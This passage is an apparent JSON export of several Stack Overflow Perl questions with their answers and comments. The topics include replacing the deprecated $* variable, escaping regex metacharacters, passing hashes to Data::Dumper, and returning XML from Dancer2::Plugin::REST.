"is_accepted": true, "score": 4, "last_activity_date": 1569867028, "creation_date": 1569867028, "answer_id": 58173119, "question_id": 58172970, "link": "https://stackoverflow.com/questions/58172970/variable-inside-a-variablename/58173119#58173119", "title": "Variable inside a variablename?", "body": "<p>You write it correctly by using Perl's array type.</p>\n\n<pre><code>my @button;\n$button[1] = 0;\n$button[2] = 123;\n$button[3] = 0;\n$button[4] = 0;\n\nfor (my $i=1; $i &lt;= 4; $i++) {\n   if ($button[$i]) {\n      print\"Yes we found positive value!\";\n   }\n}\n</code></pre>\n\n<p>It is possible to use variables to construct a variable name and to access the variable's value, but that is almost always a Bad Idea.</p>\n"}, {"tags": [], "owner": {"reputation": 478, "user_id": 1338382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Vs6If.jpg?s=128&g=1", "display_name": "rprakash", "link": "https://stackoverflow.com/users/1338382/rprakash"}, "is_accepted": false, "score": 1, "last_activity_date": 1569950994, "creation_date": 1569950994, "answer_id": 58189712, "question_id": 58172970, "link": "https://stackoverflow.com/questions/58172970/variable-inside-a-variablename/58189712#58189712", "title": "Variable inside a variablename?", "body": "<pre><code>my @buttons = (0, 123, 0, 0);\nforeach my $button (@buttons) {\n    if ($button &gt; 0) {\n        # Do something\n    }\n    else {\n        # Do something\n    }\n}\n</code></pre>\n\n<p>or,</p>\n\n<pre><code>my @buttons = (0, 123, 0, 0);\nfor (my $i=0; $i&lt;scalar @buttons; $i++) {\n    if ($buttons[$i] &gt; 0) {\n        # Do something\n    }\n    else {\n        # Do something\n    }\n}\n</code></pre>\n\n<p>Or,</p>\n\n<pre><code>my @buttons = (0, 123, 0, 0);\nforeach (@buttons) {\n    if ($_ &gt; 0) {\n        # Do something\n    }\n    else {\n        # Do something\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 27, "user_id": 5999765, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/005ee62182541ca66d93d0b324678a98?s=128&d=identicon&r=PG&f=1", "display_name": "StuckAtDatQ", "link": "https://stackoverflow.com/users/5999765/stuckatdatq"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 95, "favorite_count": 0, "accepted_answer_id": 58173119, "answer_count": 2, "score": 1, "last_activity_date": 1569954640, "creation_date": 1569866339, "question_id": 58172970, "link": "https://stackoverflow.com/questions/58172970/variable-inside-a-variablename", "title": "Variable inside a variablename?", "body": "<p>I want to check each of my 4 buttons in the <strong>for</strong> loop. However, I can't figure out how to run through them? :-/</p>\n\n<p><strong>if ('$button'.$i)</strong> seems to be the problem, but how can I write it correctly??</p>\n\n<pre><code>my $button1 = 0;\nmy $button2 = 123;\nmy $button3 = 0;\nmy $button4 = 0;\n\nfor (my $i=1; $i &lt;= 4; $i++) {\n   if ('$button'.$i) {\n      print\"Yes we found positive value!\";\n   }\n  }\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 1, "creation_date": 1569840473, "post_id": 58166262, "comment_id": 102714205, "body": "First off, my condolences. In 1997 <code>$*</code> was already deprecated for 3 years. It was outright removed in 2007."}, {"owner": {"reputation": 175, "user_id": 4022350, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Morti", "link": "https://stackoverflow.com/users/4022350/morti"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1569840823, "post_id": 58166262, "comment_id": 102714397, "body": "Yes, fortunately this is the only place in the code where it is used, just need to figure out how to change it without ruining something :)"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1569843808, "post_id": 58166262, "comment_id": 102715834, "body": "While you&#39;re fixing this code, can you please also remove the <code>&amp;</code> from <code>&amp;read_comp(...)</code>?"}], "answers": [{"comments": [{"owner": {"reputation": 175, "user_id": 4022350, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Morti", "link": "https://stackoverflow.com/users/4022350/morti"}, "edited": false, "score": 0, "creation_date": 1569845218, "post_id": 58166746, "comment_id": 102716460, "body": "You are right about it only being the first halv, after reading the rest I found found_lines being set in the else clause also  I&#39;m thinking that adding \\m there should do the trick following your thinking about the found_lines? @found_lines = grep (/$regexp/m, @tmp_list);"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "reply_to_user": {"reputation": 175, "user_id": 4022350, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Morti", "link": "https://stackoverflow.com/users/4022350/morti"}, "edited": false, "score": 0, "creation_date": 1569846237, "post_id": 58166746, "comment_id": 102716947, "body": "@Morti If the <code>else</code> clause doesn&#39;t set <code>$*</code>, you don&#39;t need to change anything."}], "tags": [], "owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "is_accepted": true, "score": 10, "last_activity_date": 1572020402, "last_edit_date": 1572020402, "creation_date": 1569841961, "answer_id": 58166746, "question_id": 58166262, "link": "https://stackoverflow.com/questions/58166262/rewriting-old-program-using-deprecated/58166746#58166746", "title": "Rewriting old program using deprecated $*", "body": "<p>Unfortunately <code>$*</code> is a global variable, so setting it has an effect on all called functions (e.g. <code>read_comp</code>) if they use regexes.</p>\n\n<p>Also, that code is written in a slightly bizarre way:</p>\n\n<ul>\n<li><p>I assume the intention was to enable \"multiline\" matching for the <code>$comp_buf =~ /$regexp/g</code> part, but <code>$*</code> is set early, so it also affects <code>$regexp !~ /([^\\\\]|^)(\\\\\\\\)*\\$$/</code> and the <code>read_comp</code> call.</p></li>\n<li><p>The checks for whether <code>$regexp</code> already starts/ends with <code>^</code>/<code>$</code> respectively are broken. For example, <code>(?:^foo$)</code> is an anchored regex, but the code would not detect that.</p></li>\n<li><p><code>grep ($_ .= \"\\n\", ...)</code> is a baffling abuse of <code>grep</code> to emulate <code>map</code>. What the code is trying to do is to get the list of lines matched by the regex. However, the way the regex is built it does not match the terminating newline character <code>\"\\n\"</code> on each line, so the code manually adds <code>\"\\n\"</code> to every returned string.</p>\n\n<p>The sane way of doing that would be:</p>\n\n<pre><code>@found_lines = map $_ . \"\\n\", ...;   # or map \"$_\\n\", ...\n</code></pre>\n\n<p>Instead of <code>map</code> we could use an imperative loop, taking advantage of the fact that <code>for</code> aliases the loop variable to the current list element:</p>\n\n<pre><code>@temp = ...;\nfor (@temp) {\n    $_ .= \"\\n\";\n}\n@found_lines = @temp;\n</code></pre>\n\n<p>Instead of a <code>for</code> loop we could use <code>grep</code> for its side effect of iterating over a list:</p>\n\n<pre><code>@temp = ...;\ngrep $_ .= \"\\n\", @temp;\n@found_lines = @temp;\n</code></pre>\n\n<p><code>grep</code> also aliases <code>$_</code> to the current element, so the \"filter expression\" can modify the list we're iterating over.</p>\n\n<p>Finally, because <code>.=</code> returns the resulting string (and strings containing <code>\"\\n\"</code> cannot be false), we can take advantage of the fact that our \"filter expression\" always returns a true value and effectively get a copy of the input list as the return value from <code>grep</code>:</p>\n\n<pre><code>@found_lines = grep $_ .= \"\\n\", ...  # blergh\n</code></pre></li>\n</ul>\n\n<p>As for the effect of <code>$*</code>: It is a boolean flag (initially false). If set to true, all regexes behave as if <code>/m</code> is in effect, i.e. <code>^</code> and <code>$</code> match at embedded newlines as well as the beginning/end of the string.</p>\n\n<p>Assuming my interpretation of the code is correct, you should be able to change it as follows:</p>\n\n<ul>\n<li><code>local ($*);</code> can be removed.</li>\n<li><code>$* = 1;</code> also needs to go.</li>\n<li><code>$comp_buf =~ /$regexp/g</code> should be changed to <code>$comp_buf =~ /$regexp/mg</code>. This is the only place I see where multiline mode makes sense.</li>\n<li><p>I'd really like to rewrite the last line. Either</p>\n\n<pre><code>@found_lines = map \"$_\\n\", ($comp_buf =~ /$regexp/g);\n</code></pre>\n\n<p>(functional style), or, if you prefer a more imperative style:</p>\n\n<pre><code>@found_lines = ($comp_buf =~ /$regexp/g);\n$_ .= \"\\n\" for @found_lines;\n</code></pre></li>\n</ul>\n"}], "owner": {"reputation": 175, "user_id": 4022350, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Morti", "link": "https://stackoverflow.com/users/4022350/morti"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 157, "favorite_count": 0, "accepted_answer_id": 58166746, "answer_count": 1, "score": 7, "last_activity_date": 1572020402, "creation_date": 1569840202, "last_edit_date": 1572020348, "question_id": 58166262, "link": "https://stackoverflow.com/questions/58166262/rewriting-old-program-using-deprecated", "title": "Rewriting old program using deprecated $*", "body": "<p>We have some really old Perl code last updated 1997. I'm trying to upgrade to a newer Perl version where <code>$*</code> is deprecated.</p>\n\n<p>I've been trying to learn how to rewrite this but the only help you get from the perlvar documentation is \"You should use the /s and /m regexp modifiers instead.\" </p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>  my ($file, $regexp, $flags) = @_;\n  my (@found_lines, @tmp_list, $comp_buf);\n  local ($*);\n\n  if ($flags =~ tr/c//d)\n  {\n    $* = 1;\n    (substr ($regexp, 0, 1) ne \"^\") &amp;&amp; ($regexp = \"^.*$regexp\");\n    ($regexp !~ /([^\\\\]|^)(\\\\\\\\)*\\$$/) &amp;&amp; ($regexp .= \".*\\$\");\n    &amp;read_comp ($file, \\$comp_buf);\n    @found_lines = grep ($_ .= \"\\n\", ($comp_buf =~ /$regexp/g));\n  }\n  else\n  {\n    @tmp_list = &amp;read_list ($file, 0);\n    @found_lines = grep (/$regexp/, @tmp_list);\n  }\n\n  if ($flags eq \"q\")\n  {\n    $#found_lines &gt;= 0;\n  }\n  elsif ($flags eq \"a\")\n  {\n    $#found_lines+1;\n  }\n  else\n  {\n    @found_lines;\n  }\n</code></pre>\n\n<p>It's really hard to know how to replace <code>$*</code> here for me, from what I can understand from the comments we use <code>$*</code> here to enable multi-line matching for the following regexp search. So I'm guessing I have to add those flags to the regexp expressions somehow.</p>\n\n<p>How do I rewrite this code to replace the existing <code>$*</code> instances?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1569832147, "post_id": 58164081, "comment_id": 102709859, "body": "like <code>s&#47;\\$array\\[1\\]&#47;$array[1]&#47;</code> ... ? (escape special characters)"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 11896915, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-xXKXzldRw6c/AAAAAAAAAAI/AAAAAAAAAV4/8_3eug-B3-A/photo.jpg?sz=128", "display_name": "Farouk H", "link": "https://stackoverflow.com/users/11896915/farouk-h"}, "edited": false, "score": 0, "creation_date": 1569832770, "post_id": 58164179, "comment_id": 102710152, "body": "Do you mean : s/$array \\ [1 \\ ]\\b/$array[1]/ ?  What about the second part ?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 1, "user_id": 11896915, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-xXKXzldRw6c/AAAAAAAAAAI/AAAAAAAAAV4/8_3eug-B3-A/photo.jpg?sz=128", "display_name": "Farouk H", "link": "https://stackoverflow.com/users/11896915/farouk-h"}, "edited": false, "score": 0, "creation_date": 1569833029, "post_id": 58164179, "comment_id": 102710305, "body": "@FaroukH: I mean what I wrote. The closing <code>]</code> can&#39;t be a special character if you&#39;ve escaped the opening <code>[</code>. And the second half of the expression isn&#39;t a regular expression so there&#39;s no need to escape anything."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1569833490, "post_id": 58164179, "comment_id": 102710551, "body": "What about the <code>$</code>?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1569834144, "post_id": 58164179, "comment_id": 102710887, "body": "And the <code>\\b</code> should probably be dropped. It effectively means <code>(?=\\w)</code> here, which doesn&#39;t seen intended."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 2, "last_activity_date": 1569838667, "last_edit_date": 1569838667, "creation_date": 1569832375, "answer_id": 58164179, "question_id": 58164081, "link": "https://stackoverflow.com/questions/58164081/perl-s-array1-b-array1-wont-replace/58164179#58164179", "title": "Perl s/$array[1]\\b/$array[1] won&#39;t replace", "body": "<p>The <code>[ ... ]</code> has a special meaning in regular expressions (it defines a \"character class\"). If you want to use <code>[</code> to mean a <code>[</code>, then you need to escape it with a <code>\\</code>.</p>\n\n<pre><code>s/\\$array\\[1]/$array[1]/\n</code></pre>\n\n<p><strong>Update:</strong> Added escape to <code>$</code>. Removed <code>\\b</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "is_accepted": false, "score": 1, "last_activity_date": 1569875103, "creation_date": 1569875103, "answer_id": 58174856, "question_id": 58164081, "link": "https://stackoverflow.com/questions/58164081/perl-s-array1-b-array1-wont-replace/58174856#58174856", "title": "Perl s/$array[1]\\b/$array[1] won&#39;t replace", "body": "<p>I would recommend a real templating engine to perform such a substitution, this will allow you to extend it to things that don't look exactly like <code>$array[1]</code> without making it more complicated, but you will need to alter your input to what the templating engine expects. One option is <a href=\"https://metacpan.org/pod/Text::Template\" rel=\"nofollow noreferrer\">Text::Template</a>.</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Text::Template 'fill_in_string';\n\nmy $input = 'foo {$array[1]} bar';\nmy @array = 1..10;\nmy $rendered = fill_in_string $input, HASH =&gt; {array =&gt; \\@array};\nprint $rendered, \"\\n\"; # foo 2 bar\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 11896915, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-xXKXzldRw6c/AAAAAAAAAAI/AAAAAAAAAV4/8_3eug-B3-A/photo.jpg?sz=128", "display_name": "Farouk H", "link": "https://stackoverflow.com/users/11896915/farouk-h"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 72, "favorite_count": 1, "answer_count": 2, "score": 0, "last_activity_date": 1569875103, "creation_date": 1569832009, "question_id": 58164081, "link": "https://stackoverflow.com/questions/58164081/perl-s-array1-b-array1-wont-replace", "title": "Perl s/$array[1]\\b/$array[1] won&#39;t replace", "body": "<p>I would like to replace the string $array[1] by the actual variable value.\nthe \\b doesn't seem to work \nDoes anyone know how the replace the array variable ? What's the delimiter ?</p>\n\n<p>s/$array[1]\\b/$array[1]</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 2, "creation_date": 1569769233, "post_id": 58156332, "comment_id": 102695459, "body": "it works here. Try adding a backslash in front of the hash: <code>print Dumper \\%attribhash</code>"}, {"owner": {"reputation": 4229, "user_id": 3973175, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/9c15391d610e59c350912be638b14074?s=128&d=identicon&r=PG", "display_name": "con", "link": "https://stackoverflow.com/users/3973175/con"}, "edited": false, "score": 0, "creation_date": 1569852080, "post_id": 58156332, "comment_id": 102720300, "body": "<a href=\"https://metacpan.org/pod/DDP\" rel=\"nofollow noreferrer\">metacpan.org/pod/DDP</a> works better than Data::Dumper"}], "answers": [{"tags": [], "owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "is_accepted": false, "score": 7, "last_activity_date": 1569771019, "last_edit_date": 1569771019, "creation_date": 1569770255, "answer_id": 58156562, "question_id": 58156332, "link": "https://stackoverflow.com/questions/58156332/reading-a-file-content-into-perl-hash-using-map/58156562#58156562", "title": "Reading a file content into perl hash using map", "body": "<p>According to <a href=\"https://perldoc.perl.org/perldata.html#List-value-constructors\" rel=\"noreferrer\">perldoc perldata</a>:</p>\n\n<blockquote>\n  <p>LISTs do automatic interpolation of sublists. That is, when a LIST is\n  evaluated, each element of the list is evaluated in list context, and\n  the resulting list value is interpolated into LIST just as if each\n  individual element were a member of LIST. Thus arrays and hashes lose\n  their identity in a LIST</p>\n</blockquote>\n\n<p>So you need to pass the hash by reference to <a href=\"https://metacpan.org/pod/Data::Dumper#Functions\" rel=\"noreferrer\"><code>Dumper()</code></a> or else it will be flattened into a list of separate arguments. For example, if you have:</p>\n\n<pre><code>my %foo = ( a =&gt; 'A', b =&gt; 'B');\nprint Dumper %foo;\n</code></pre>\n\n<p><strong>Output</strong>:</p>\n\n<pre><code>$VAR1 = 'b';\n$VAR2 = 'B';\n$VAR3 = 'a';\n$VAR4 = 'A';\n</code></pre>\n\n<p>but if you pass a reference to  <code>%foo</code> instead (by putting a backslash in front):</p>\n\n<pre><code>print Dumper \\%foo;\n</code></pre>\n\n<p>we get:</p>\n\n<pre><code>$VAR1 = {\n          'b' =&gt; 'B',\n          'a' =&gt; 'A'\n        };\n</code></pre>\n\n<h2>References:</h2>\n\n<ul>\n<li><a href=\"https://metacpan.org/pod/Data::Dumper\" rel=\"noreferrer\">Data::Dumper</a></li>\n<li><a href=\"https://perldoc.perl.org/perlref.html\" rel=\"noreferrer\">perldoc perlref</a></li>\n<li><a href=\"https://stackoverflow.com/q/1162245/2173773\">How can I print the contents of a hash in Perl?</a></li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 2, "last_activity_date": 1569844037, "creation_date": 1569844037, "answer_id": 58167299, "question_id": 58156332, "link": "https://stackoverflow.com/questions/58156332/reading-a-file-content-into-perl-hash-using-map/58167299#58167299", "title": "Reading a file content into perl hash using map", "body": "<p>It's always worth reading all of the documentation for the modules you're trying to use. The <a href=\"https://metacpan.org/pod/Data::Dumper#BUGS\" rel=\"nofollow noreferrer\">\"BUGS\" section in the Data::Dumper manual</a> says:</p>\n\n<blockquote>\n  <p>Due to limitations of Perl subroutine call semantics, you cannot pass an array or hash. Prepend it with a <code>\\</code> to pass its reference instead.</p>\n</blockquote>\n"}], "owner": {"reputation": 65, "user_id": 1372715, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/998b3423f2e6bca92cc51b194e688284?s=128&d=identicon&r=PG", "display_name": "BVAD", "link": "https://stackoverflow.com/users/1372715/bvad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 128, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1569844037, "creation_date": 1569768716, "question_id": 58156332, "link": "https://stackoverflow.com/questions/58156332/reading-a-file-content-into-perl-hash-using-map", "title": "Reading a file content into perl hash using map", "body": "<p>I am trying to read the contents of a file into a hash\nfile contents look line,</p>\n\n<pre><code>A|A1\nB|B1\nC|C1\n</code></pre>\n\n<p>the code I have is </p>\n\n<pre><code>use strict;\nuse warnings;\nuse Data::Dumper;\n\nmy $instAttribFileName=\"DATABYIDENTIFIER_InstCommonAttrList.config\";\n\nopen(IFH,$instAttribFileName) or die \"cannot open file\";\nmy %attribhash = ();\n%attribhash = map {chomp; split /\\|/} (&lt;IFH&gt;);\nprint Dumper %attribhash;\n</code></pre>\n\n<p>Dumper does not print the hash but reads A,A1 etc into seperate variables.</p>\n\n<p>what am I doing wrong here?</p>\n"}, {"tags": ["xml", "perl"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569764213, "post_id": 58155547, "comment_id": 102694178, "body": "Try <code>application&#47;xml</code>"}, {"owner": {"reputation": 99, "user_id": 12138447, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/016353c3f0f6ecc47fccbd62ba848eb9?s=128&d=identicon&r=PG&f=1", "display_name": "user12138447", "link": "https://stackoverflow.com/users/12138447/user12138447"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569764841, "post_id": 58155547, "comment_id": 102694343, "body": "Thanks ikegami, but unfortunately curl -H &#39;Accept-Type: application/xml&#39; https://&lt;mydomain&gt;/api/1.xml changes nothing, the exact same server error is returned."}, {"owner": {"reputation": 99, "user_id": 12138447, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/016353c3f0f6ecc47fccbd62ba848eb9?s=128&d=identicon&r=PG&f=1", "display_name": "user12138447", "link": "https://stackoverflow.com/users/12138447/user12138447"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569765395, "post_id": 58155547, "comment_id": 102694484, "body": "I&#39;ve now updated my question to reflect this."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569766944, "post_id": 58155547, "comment_id": 102694887, "body": "By the way, do you realize that this will use XML::Simple, <a href=\"https://stackoverflow.com/q/33267765/589924\">a module you should avoid</a> because it&#39;s insanely hard to use the data structures or XML is returns?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1569769729, "post_id": 58155547, "comment_id": 102695570, "body": "I&#39;ve been looking into this for a while, and I&#39;ve come to the conclusion that the list of extensions is hardcoded to <code>yaml</code>, <code>yml</code>, <code>json</code>, <code>dump</code>."}, {"owner": {"reputation": 99, "user_id": 12138447, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/016353c3f0f6ecc47fccbd62ba848eb9?s=128&d=identicon&r=PG&f=1", "display_name": "user12138447", "link": "https://stackoverflow.com/users/12138447/user12138447"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569776022, "post_id": 58155547, "comment_id": 102697197, "body": "@ikegami: Thanks for looking into this. I guess XML is less popular than it used to be. I&#39;ll have to generate my XML responses in some other way."}], "owner": {"reputation": 99, "user_id": 12138447, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/016353c3f0f6ecc47fccbd62ba848eb9?s=128&d=identicon&r=PG&f=1", "display_name": "user12138447", "link": "https://stackoverflow.com/users/12138447/user12138447"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 101, "favorite_count": 0, "answer_count": 0, "score": 4, "last_activity_date": 1569765354, "creation_date": 1569762799, "last_edit_date": 1569765354, "question_id": 58155547, "link": "https://stackoverflow.com/questions/58155547/how-to-return-xml-with-dancer2pluginrest", "title": "How to return XML with Dancer2::Plugin::REST?", "body": "<p>I'm successfully using Dancer2::Plugin::REST to return JSON from my web server when users access mydomain.com/api/1.json .While retaining this feature, how can I use Dancer2::Plugin2::REST to return XML when users access mydomain.com/api/1.xml ? </p>\n\n<p>My config.yml contains this section:</p>\n\n<pre><code>serializers:\n  json: JSON\n  yml:  YAML\n  yaml: YAML\n  dump: Dumper\n  xml:  XML\n</code></pre>\n\n<p>My lib/MyApp/API.pm looks like this:</p>\n\n<pre><code>package MyApp::API;\n\nuse Dancer2;\n\nuse Dancer2::Plugin::REST;\nprepare_serializer_for_format;\n\nget '/1.:format' =&gt; sub {\n    return { 'temperature' =&gt; '10', 'date' =&gt; '2019-09-01' };\n};\n\ntrue;\n</code></pre>\n\n<p>As expected I get the correct JSON snippet when running:</p>\n\n<pre><code>curl -H 'Accept-Type: text/json' https://&lt;mydomain&gt;/api/1.json\n</code></pre>\n\n<p>But when I run:</p>\n\n<pre><code>curl -H 'Accept-Type: text/xml' https://&lt;mydomain&gt;/api/1.xml\n</code></pre>\n\n<p>or</p>\n\n<pre><code>curl -H 'Accept-Type: application/xml' https://&lt;mydomain&gt;/api/1.xml\n</code></pre>\n\n<p>or</p>\n\n<pre><code>curl https://&lt;mydomain&gt;/api/1.xml\n</code></pre>\n\n<p>I get a server error in response:</p>\n\n<pre><code>Internal Server Error\n\nReference {\"exception\" =&gt; \"Reference {\\\"date\\\" =&gt; \\\"2019-09-01\\\",\\\"tem...} did not pass type constraint \"Str\" (in $self-&gt;{\"content\"}) at /usr/local/share/perl/5.26.1/Dancer2/Core/Response.pm line 122\n    \"Str\" is a subtype of \"Value\"\n    Reference {\"exception\" =&gt; \"Reference {\\\"date\\\" =&gt; \\\"2019-09-01\\\",\\\"tem...} did not pass type constraint \"Value\" (in $self-&gt;{\"content\"})\n    \"Value\" is defined as: (defined($_) and not ref($_))\n\n</code></pre>\n\n<p>I expected to get a XML response, not a server error. What am I missing?</p>\n"}, {"tags": ["perl", "module-build"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1569762426, "post_id": 58155291, "comment_id": 102693759, "body": "Looks like it uses <code>pkg-config --modversion gsl</code> to check if the library is already installed. I don&#39;t know what that is, or how it knows what libraries are installed."}, {"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1569763163, "post_id": 